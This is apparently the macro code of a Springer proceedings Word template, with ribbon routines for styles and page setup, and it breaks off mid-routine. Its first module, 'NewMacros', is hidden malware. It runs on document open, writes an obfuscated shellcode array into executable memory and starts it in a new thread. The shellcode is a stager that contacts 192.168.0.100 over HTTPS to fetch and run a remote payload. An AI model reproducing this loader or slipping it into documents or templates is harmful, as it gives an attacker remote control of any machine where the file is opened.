Attribute VB_Name = "NewMacros"
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Nlgcxmkuj As Long, ByVal Huktofhct As Long, ByVal Ezh As LongPtr, Rptd As Long, ByVal Pmxv As Long, Zmjotbq As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Huyavr As Long, ByVal Hsdobpdk As Long, ByVal Pdetmga As Long, ByVal Pgusprw As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Htzq As LongPtr, ByRef Oqlegqxo As Any, ByVal Apo As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Nlgcxmkuj As Long, ByVal Huktofhct As Long, ByVal Ezh As Long, Rptd As Long, ByVal Pmxv As Long, Zmjotbq As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Huyavr As Long, ByVal Hsdobpdk As Long, ByVal Pdetmga As Long, ByVal Pgusprw As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Htzq As Long, ByRef Oqlegqxo As Any, ByVal Apo As Long) As Long
#End If

Sub Auto_Open()
    Dim Fhpfcoow As Long, Ewx As Variant, Fjbl As Long
#If VBA7 Then
    Dim Oayno As LongPtr, Vnksrrz As LongPtr
#Else
    Dim Oayno As Long, Vnksrrz As Long
#End If
    Ewx = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, _
83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, _
83, 104, 187, 1, 0, 0, 232, 178, 0, 0, 0, 47, 51, 49, 83, 95, 75, 114, 120, 121, 102, 98, 67, 56, 111, 98, 50, 103, 52, 82, 74, 84, 106, 81, 86, 102, 116, 48, 57, 120, 108, 109, 116, 75, 99, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 50, 224, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, _
128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 74, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, _
87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 48, 46, 49, 48, 48, 0, 187, 240, 181, 162, 86, 106, 0, 83, 255, 213)

    Oayno = VirtualAlloc(0, UBound(Ewx), &H1000, &H40)
    For Fjbl = LBound(Ewx) To UBound(Ewx)
        Fhpfcoow = Ewx(Fjbl)
        Vnksrrz = RtlMoveMemory(Oayno + Fjbl, Fhpfcoow, 1)
    Next Fjbl
    Vnksrrz = CreateThread(0, 0, Oayno, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

Attribute VB_Name = "SpLNProcMacros"
Option Explicit
Option Compare Text

Global Const ERR_CANCEL = vbObjectError + 1
Global Const ERR_USRMSG = vbObjectError + 2
Global Const LNCS_TPL_Name = "splnproc1702.docm"
Global Const C_TITLE = "Springer proceedings template"

Public Sub RestorePageSetup()
Dim ur As UndoRecord

    On Error GoTo ERROR_HANDLER
    If StdPageSetup Then Exit Sub
    If MsgBox("The page dimensions do not conform with the template's standard!" & vbCrLf & _
              "Do you want to apply the standard page layout?", vbExclamation + vbYesNo, C_TITLE) = vbNo Then
       Exit Sub
    End If
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Restore page setup"
    With ActiveDocument.PageSetup
       .PageHeight = MillimetersToPoints(297)
       .PageWidth = MillimetersToPoints(210)
       .TopMargin = MillimetersToPoints(52)
       .BottomMargin = MillimetersToPoints(52)
       .LeftMargin = MillimetersToPoints(44)
       .RightMargin = MillimetersToPoints(44)
       .HeaderDistance = MillimetersToPoints(42)
       .FooterDistance = MillimetersToPoints(41)
       .Orientation = wdOrientPortrait
       .Gutter = 0
       .OddAndEvenPagesHeaderFooter = True
       .DifferentFirstPageHeaderFooter = True
       .VerticalAlignment = wdAlignVerticalTop
       .LineNumbering.Active = False
       .SuppressEndnotes = False
       .MirrorMargins = False
       .TwoPagesOnOne = False
    End With
    'Switch on hyphenation
    With ActiveDocument
       .AutoHyphenation = True
       .HyphenateCaps = False
       'Set the hyphenation zone to 20pt, approx. 7mm
       .HyphenationZone = 20
       .ConsecutiveHyphensLimit = 0
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
MsgBox "An error occurred while checking the page setup: " & vbCrLf & vbCrLf & Err.Description, vbCritical, C_TITLE
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Private Function StdPageSetup() As Boolean

    On Error Resume Next
    With ActiveDocument.PageSetup
       If Abs(.PageHeight - MillimetersToPoints(297)) > 1 Then
          Exit Function
       End If
       If Abs(.PageWidth - MillimetersToPoints(210)) > 1 Then
          Exit Function
       End If
       If Abs(.TopMargin - MillimetersToPoints(52)) > 1 Then
          Exit Function
       End If
       If Abs(.BottomMargin - MillimetersToPoints(52)) > 1 Then
          Exit Function
       End If
       If Abs(.LeftMargin - MillimetersToPoints(44)) > 1 Then
          Exit Function
       End If
       If Abs(.RightMargin - MillimetersToPoints(44)) > 1 Then
          Exit Function
       End If
       If Abs(.HeaderDistance - MillimetersToPoints(42)) > 1 Then
          Exit Function
       End If
       If Abs(.FooterDistance - MillimetersToPoints(41)) > 1 Then
          Exit Function
       End If
       If .Orientation <> wdOrientPortrait Then
          Exit Function
       End If
       If .Gutter <> 0 Then
          Exit Function
       End If
       If Not .OddAndEvenPagesHeaderFooter Then
          Exit Function
       End If
       If Not .DifferentFirstPageHeaderFooter Then
          Exit Function
       End If
       If .VerticalAlignment <> wdAlignVerticalTop Then
          Exit Function
       End If
    End With
    With ActiveDocument
       If Not .AutoHyphenation Then
          Exit Function
       End If
       If .HyphenateCaps Then
          Exit Function
       End If
       'Skip the other hyphenation options, i.e. retain personal settings
    End With
    StdPageSetup = True

End Function

Public Sub CheckEnsureStyles()
'Make sure that all styles that are available through the custom ribbon are also present in
'this document
Dim ur              As UndoRecord
Dim objStyle        As Style
Dim i               As Integer

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Check (and restore) missing styles"
    'Check list styles
    AddMissingStyle "headings", wdStyleTypeList, objStyle
    AddMissingStyle "arabnumitem", wdStyleTypeList, objStyle
    AddMissingStyle "itemization1", wdStyleTypeList, objStyle
    AddMissingStyle "itemization2", wdStyleTypeList, objStyle
    AddMissingStyle "referencelist", wdStyleTypeList, objStyle
    'Check paragraph styles
    If AddMissingStyle("p1a", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = wdStyleNormal
          .ParagraphFormat.FirstLineIndent = 0
       End With
    End If
    If AddMissingStyle("abstract", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 30
          .ParagraphFormat.SpaceAfter = 18
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.LeftIndent = 28.35
          .ParagraphFormat.RightIndent = 28.35
       End With
    End If
    If AddMissingStyle("address", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceAfter = 10
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
       End With
    End If
    If AddMissingStyle("author", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = "address"
          .ParagraphFormat.SpaceAfter = 10
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
       End With
    End If
    If AddMissingStyle("bulletitem", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 8
          .ParagraphFormat.SpaceAfter = 8
          If ActiveDocument.Styles("itemization1").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'itemization1' cannot be accessed!"
          End If
          ActiveDocument.Styles("itemization1").ListTemplate.ListLevels(1).LinkedStyle = "bulletitem"
       End With
    End If
    If AddMissingStyle("dashitem", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 8
          .ParagraphFormat.SpaceAfter = 8
          If ActiveDocument.Styles("itemization2").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'itemization2' cannot be accessed!"
          End If
          ActiveDocument.Styles("itemization2").ListTemplate.ListLevels(1).LinkedStyle = "dashitem"
       End With
    End If
    If AddMissingStyle("equation", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 8
          .ParagraphFormat.SpaceAfter = 8
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.TabStops.Add 164.45, wdCenter
          .ParagraphFormat.TabStops.Add 345.85, wdRight
       End With
    End If
    If AddMissingStyle("figurecaption", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = wdStyleNormal
          .ParagraphFormat.KeepWithNext = True
          .ParagraphFormat.KeepTogether = True
          .ParagraphFormat.SpaceBefore = 6
          .ParagraphFormat.SpaceAfter = 12
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
          .Font.Size = 9
       End With
    End If
    If AddMissingStyle("heading1", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = "p1a"
          .ParagraphFormat.KeepWithNext = True
          .ParagraphFormat.KeepTogether = True
          .ParagraphFormat.Hyphenation = False
          .ParagraphFormat.SpaceBefore = 18
          .ParagraphFormat.SpaceAfter = 12
          .ParagraphFormat.LineSpacing = 15
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.LeftIndent = 28.35
          .ParagraphFormat.RightIndent = 28.35
          .ParagraphFormat.Alignment = wdAlignParagraphLeft
          .ParagraphFormat.OutlineLevel = wdOutlineLevel1
          .Font.Bold = True
          .Font.Size = 12
          If ActiveDocument.Styles("headings").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'headings' cannot be accessed!"
          End If
          ActiveDocument.Styles("headings").ListTemplate.ListLevels(1).LinkedStyle = "heading1"
       End With
    End If
    If AddMissingStyle("heading2", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = "p1a"
          .ParagraphFormat.KeepWithNext = True
          .ParagraphFormat.KeepTogether = True
          .ParagraphFormat.Hyphenation = False
          .ParagraphFormat.SpaceBefore = 18
          .ParagraphFormat.SpaceAfter = 8
          .ParagraphFormat.LeftIndent = 28.35
          .ParagraphFormat.RightIndent = 28.35
          .ParagraphFormat.Alignment = wdAlignParagraphLeft
          .ParagraphFormat.OutlineLevel = wdOutlineLevel2
          .Font.Bold = True
          .Font.Size = 10
          If ActiveDocument.Styles("headings").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'headings' cannot be accessed!"
          End If
          ActiveDocument.Styles("headings").ListTemplate.ListLevels(2).LinkedStyle = "heading2"
       End With
    End If
    If AddMissingStyle("image", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 12
          .ParagraphFormat.SpaceAfter = 6
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
       End With
    End If
    If AddMissingStyle("keywords", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = "abstract"
          .NextParagraphStyle = "heading1"
          .ParagraphFormat.SpaceBefore = 11
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphLeft
       End With
    End If
    If AddMissingStyle("numitem", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 8
          .ParagraphFormat.SpaceAfter = 8
          If ActiveDocument.Styles("arabnumitem").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'arabnumitem' cannot be accessed!"
          End If
          ActiveDocument.Styles("arabnumitem").ListTemplate.ListLevels(1).LinkedStyle = "numitem"
       End With
    End If
    If AddMissingStyle("programcode", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.SpaceBefore = 8
          .ParagraphFormat.SpaceAfter = 8
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphLeft
          .ParagraphFormat.TabStops.Add 11.35, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 22.7, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 34, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 45.35, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 56.7, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 68.5, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 79.4, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 90.7, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 102.05, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 113.4, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 124.75, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 136.1, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 147.4, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 158.75, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 170.1, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 181.45, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 192.8, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 204.1, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 215.45, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 226.8, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 238.15, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 249.5, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 260.8, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 272.15, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 283.5, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 294.85, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 306.2, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 317.5, wdAlignTabLeft
          .ParagraphFormat.TabStops.Add 328.85, wdAlignTabLeft
          .Font.Name = "Courier"
       End With
    End If
    If AddMissingStyle("referenceitem", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          If ActiveDocument.Styles("referencelist").ListTemplate Is Nothing Then
             Err.Raise ERR_USRMSG, , "The list style 'referencelist' cannot be accessed!"
          End If
          ActiveDocument.Styles("referencelist").ListTemplate.ListLevels(1).LinkedStyle = "referenceitem"
          .Font.Size = 9
       End With
    End If
    If AddMissingStyle("papertitle", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = "author"
          .ParagraphFormat.KeepWithNext = True
          .ParagraphFormat.KeepTogether = True
          .ParagraphFormat.Hyphenation = False
          .ParagraphFormat.SpaceAfter = 24
          .ParagraphFormat.LineSpacing = 18
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
          .Font.Bold = True
          .Font.Size = 14
       End With
    End If
    If AddMissingStyle("papersubtitle", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = "papertitle"
          .NextParagraphStyle = "author"
          .ParagraphFormat.SpaceBefore = 6
          .ParagraphFormat.LineSpacing = 14
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .Font.Size = 12
       End With
    End If
    If AddMissingStyle("tablecaption", wdStyleTypeParagraph, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleNormal
          .NextParagraphStyle = wdStyleNormal
          .ParagraphFormat.KeepWithNext = True
          .ParagraphFormat.KeepTogether = True
          .ParagraphFormat.SpaceBefore = 12
          .ParagraphFormat.SpaceAfter = 6
          .ParagraphFormat.LineSpacing = 11
          .ParagraphFormat.LineSpacingRule = wdLineSpaceAtLeast
          .ParagraphFormat.FirstLineIndent = 0
          .ParagraphFormat.Alignment = wdAlignParagraphCenter
          .Font.Size = 9
       End With
    End If
    'Check character styles
    If AddMissingStyle("e-mail", wdStyleTypeCharacter, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleDefaultParagraphFont
          .Font.Name = "Courier"
          .LanguageID = wdNoProofing
       End With
    End If
    If AddMissingStyle("heading3", wdStyleTypeCharacter, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleDefaultParagraphFont
          .Font.Bold = True
       End With
    End If
    If AddMissingStyle("heading4", wdStyleTypeCharacter, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleDefaultParagraphFont
          .Font.Italic = True
       End With
    End If
    If AddMissingStyle("url", wdStyleTypeCharacter, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleDefaultParagraphFont
          .Font.Name = "Courier"
          .LanguageID = wdNoProofing
       End With
    End If
    If AddMissingStyle("ORCID", wdStyleTypeCharacter, objStyle) Then
       With objStyle
          .BaseStyle = wdStyleDefaultParagraphFont
          .Font.Position = 0
          .Font.Superscript = True
          .LanguageID = wdNoProofing
       End With
    End If
    MsgBox "All template styles have been checked and, if necessary, been restored!", vbInformation Or vbOKOnly, C_TITLE
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
MsgBox "Corrupted template: " & vbCrLf & vbCrLf & Err.Description, vbCritical, C_TITLE
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Private Function StyleExists(ByVal StyleName As String) As Boolean
Dim objStyle As Style

    On Error Resume Next
    'Try to find the style in the document
    Set objStyle = ActiveDocument.Styles(StyleName)
    StyleExists = Not (objStyle Is Nothing)

End Function

Private Function AddMissingStyle(ByVal StyleName As String, ByRef StyleType As WdStyleType, ByRef NewStyle As Style) As Boolean
Dim i        As Long

    If Not StyleExists(StyleName) Then
       If StyleType = wdStyleTypeList Then
          'Auto-creation of list styles is not supported in this version
          Err.Raise ERR_USRMSG, , "The list style '" & StyleName & "' has been deleted, but cannot automatically be restored!"
       End If
    Else
       Set NewStyle = ActiveDocument.Styles(StyleName)
       If NewStyle.Type = StyleType Then
          'Style exists and the style type is correct --> exit
          AddMissingStyle = True
          Exit Function
       ElseIf StyleType = wdStyleTypeList Then
          'Auto-creation of list styles is not supported in this version
          Err.Raise ERR_USRMSG, , "The list style '" & StyleName & "' has been altered, but cannot automatically be restored!"
       Else
          'Style exists, but the style type is incorrect --> rename the existing style
          Do
             'Look for a free name
             If Not StyleExists(StyleName & " backup" & i) Then
                Exit Do
             End If
             i = i + 1
          Loop
          'Rename the style
          ActiveDocument.Styles(StyleName).NameLocal = StyleName & " backup" & i
       End If
    End If
    'Add a new style as a copy of the normal style
    Set NewStyle = ActiveDocument.Styles.Add(StyleName, StyleType)
    NewStyle.Font = ActiveDocument.Styles(wdStyleNormal).Font
    If StyleType <> wdStyleTypeParagraph Then
       NewStyle.ParagraphFormat = ActiveDocument.Styles(wdStyleNormal).ParagraphFormat
       NewStyle.AutomaticallyUpdate = False
    End If
    AddMissingStyle = Not (NewStyle Is Nothing)
    Exit Function

End Function

Public Sub LoadSpProcRibbon(IRibbon As IRibbonUI)
    On Error Resume Next
    IRibbon.ActivateTab ("tabSpProc")
End Sub

Public Sub MakeTitle(control As IRibbonControl)
'Applies the "papertitle" style to max 1 selected paragraph
'Removes SpaceAfter, if a subtitle is following
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'papertitle' style"
    If Not ApplyParaStyle("papertitle", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Remove SpaceAfter, if "papersubtitle" is following
       If Not .Paragraphs(1).Next Is Nothing Then
          If .Paragraphs(1).Next.Style = "papersubtitle" Then
             .Paragraphs(1).SpaceAfter = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeTitle): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeSubtitle(control As IRibbonControl)
'Applies the "papersubtitle" style to max 1 selected paragraph
'Removes SpaceAfter from a preceeding "papertitle" paragraph
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'papersubtitle' style"
    If Not ApplyParaStyle("papersubtitle", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Remove SpaceAfter from preceeding "papertitle" paragraph
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "papertitle" Then
             .Paragraphs(1).Previous.SpaceAfter = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeSubtitle): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeAuthor(control As IRibbonControl)
Dim ur  As UndoRecord

    On Error Resume Next
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'author' style"
    ApplyParaStyle "author", 0, False
    Application.ScreenRefresh
    ur.EndCustomRecord

End Sub

Public Sub MakeORCID(control As IRibbonControl)
Dim ur  As UndoRecord
Dim strStyle As String

    On Error Resume Next
    strStyle = Selection.ParagraphFormat.Style
    If LCase$(strStyle) <> "author" Then
       MsgBox "The current paragraph style was expected to be 'author'," & vbCrLf & _
              "but it is '" & strStyle & "'." & vbCrLf & _
              "Please only use this button to style ORCID ids added to author names" & vbCrLf & _
              "that have previously been formatted with the 'author' style!", vbExclamation, C_TITLE
       Exit Sub
    End If
    If Not (Selection.Text Like "[[]####-####-####-####[]]") Then
       MsgBox "Please use the format '[0000-1111-2222-3333]' for adding ORCID ids to author names!", vbExclamation, C_TITLE
       Exit Sub
    End If
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'ORCID' character style"
    ApplyCharStyle "ORCID", 0
    Application.ScreenRefresh
    ur.EndCustomRecord

End Sub

Public Sub MakeAddress(control As IRibbonControl)
Dim ur  As UndoRecord

    On Error Resume Next
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'address' style"
    ApplyParaStyle "address", 0, True
    Application.ScreenRefresh
    ur.EndCustomRecord

End Sub

Public Sub MakeEMail(control As IRibbonControl)
Dim ur  As UndoRecord

    On Error Resume Next
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'e-mail' character style"
    ApplyCharStyle "e-mail", 0
    Application.ScreenRefresh
    ur.EndCustomRecord

End Sub

Public Sub MakeAbstract(control As IRibbonControl)
'Applies the "abstract" style to any selection
'Types the word "Abstract." at the beginning of the first paragraph (only if the preceeding paragraph is no "abstract")
'Removes SpaceAfter from the last paragraph, if "keywords" are following
Dim ur              As UndoRecord
Dim objLastSelPara  As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'abstract' style"
    Set objLastSelPara = Selection.Paragraphs(Selection.Paragraphs.Count)
    If Not ApplyParaStyle("abstract", 0, True) Then Err.Raise ERR_CANCEL
    'Remove SpaceAfter from the last paragraph, if "keywords" are following
    If Not objLastSelPara Is Nothing Then
       If Not objLastSelPara.Next Is Nothing Then
          If objLastSelPara.Next.Style = "keywords" Then
             objLastSelPara.SpaceAfter = 0
          End If
       End If
    End If
    With Selection
       'If the preceeding paragraph is already an abstract, don't type "Abstract." again
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "abstract" Then
             Err.Raise ERR_CANCEL
          End If
       End If
       'Type "Abstract."
       If Trim(.Paragraphs(1).Range.Words(1).Text) <> "Abstract" Then
          .Style = wdStyleDefaultParagraphFont
          .Font.Bold = True
          .TypeText "Abstract."
          .Font.Bold = False
          .TypeText " "
       Else
          .Start = .Paragraphs(1).Range.Words(1).End
          If .Characters(1) <> "." Then
             .Characters(1) = "."
          End If
          .Paragraphs(1).Range.Words(1).Select
          .MoveEndWhile "."
          .Font.Bold = True
       End If
       .Paragraphs(1).FirstLineIndent = 0
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeAbstract): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeKeywords(control As IRibbonControl)
'Applies the "keywords" style to max 1 paragraph
'Removes SpaceAfter from a preceeding "abstract"
'Types the word "Keywords." at the beginning of the paragraph
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'keywords' style"
    If Not ApplyParaStyle("keywords", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Remove SpaceAfter from a preceeding "abstract" paragraph
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "abstract" Then
             .Paragraphs(1).Previous.SpaceAfter = 0
          End If
       End If
       'Type "Keywords."
       If Trim(.Paragraphs(1).Range.Words(1).Text) <> "Keywords" Then
          .Style = wdStyleDefaultParagraphFont
          .Font.Bold = True
          .TypeText "Keywords:"
          .Font.Bold = False
          .TypeText " "
       Else
          .Start = .Paragraphs(1).Range.Words(1).End
          If .Characters(1) <> ":" Then
             .Characters(1) = ":"
          End If
          .Paragraphs(1).Range.Words(1).Select
          .MoveEndWhile ":"
          .Font.Bold = True
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeKeywords): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub H1(control As IRibbonControl)
'Applies the "heading1" style to max 1 paragraph
'Remove SpaceBefore from a directly following "heading2"
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'H1' style"
    If Not ApplyParaStyle("heading1", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
